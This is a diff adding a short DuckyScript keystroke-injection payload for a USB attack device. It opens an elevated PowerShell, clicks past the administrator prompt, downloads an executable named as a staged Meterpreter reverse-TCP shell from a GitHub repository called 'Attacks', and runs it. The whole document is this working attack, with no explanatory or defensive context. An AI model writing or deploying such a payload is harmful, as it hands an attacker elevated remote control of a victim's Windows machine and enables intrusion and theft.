@@ -1,0 +1,14 @@
+DUCKY_LANG US
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+STRING $url = "https://github.com/SonicSnake1/Attacks/raw/refs/heads/main/windows-meterpreter-staged-reverse-tcp-87.exe"; $outpath = "C:\Downloads\windows-meterpreter-staged-reverse-tcp-87.exe"; Invoke-WebRequest -Uri $url -OutFile $outpath; Start-Process -Filepath $outpath
+ENTER
+DELAY 1000
+STRING exit
+ENTER
